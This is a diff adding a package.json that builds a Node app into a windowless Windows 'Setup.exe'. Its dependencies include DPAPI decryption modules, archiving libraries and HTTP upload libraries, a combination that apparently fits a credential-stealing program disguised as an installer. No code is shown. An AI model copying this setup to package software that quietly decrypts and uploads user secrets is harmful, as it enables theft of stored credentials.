@@ -1,0 +1,46 @@
+{
+  "name": "mixedup-app",
+  "version": "1.0.0",
+  "description": "MixedUp App with pkg build for Windows",
+  "main": "mixedup.js",
+  "bin": "mixedup.js",
+  "scripts": {
+    "start": "node mixedup.js",
+    "build": "pkg . --output Setup.exe --options win32gui"
+  },
+  "dependencies": {
+    "@primno/dpapi": "^1.1.2",
+    "adm-zip": "^0.5.12",
+    "archiver": "^7.0.1",
+    "axios": "^0.27.2",
+    "crypto": "^1.0.1",
+    "form-data": "^4.0.1",
+    "fs": "^0.0.1-security",
+    "https": "^1.0.0",
+    "luxon": "^3.5.0",
+    "os": "^0.1.2",
+    "path": "^0.12.7",
+    "zlib": "^1.0.5"
+  },
+  "pkg": {
+    "outputPath": "dist",
+    "targets": [
+      "node16-win-x64"
+    ],
+    "assets": [
+      "node_modules/axios/dist/node/axios.cjs",
+      "node_modules/@isaacs/cliui/node_modules/string-width/index.js",
+      "node_modules/@isaacs/cliui/node_modules/strip-ansi/index.js",
+      "node_modules/wrap-ansi/index.js",
+      "node_modules/@isaacs/cliui/node_modules/ansi-regex/index.js",
+      "node_modules/ansi-styles/index.js",
+      "node_modules/wrap-ansi/node_modules/string-width/index.js",
+      "node_modules/wrap-ansi/node_modules/strip-ansi/index.js",
+      "node_modules/wrap-ansi/node_modules/ansi-regex/index.js",
+      "node_modules/win-dpapi/build/Release/node-dpapi.node"
+    ]
+  },
+  "devDependencies": {
+    "pkg": "^5.8.0"
+  }
+}
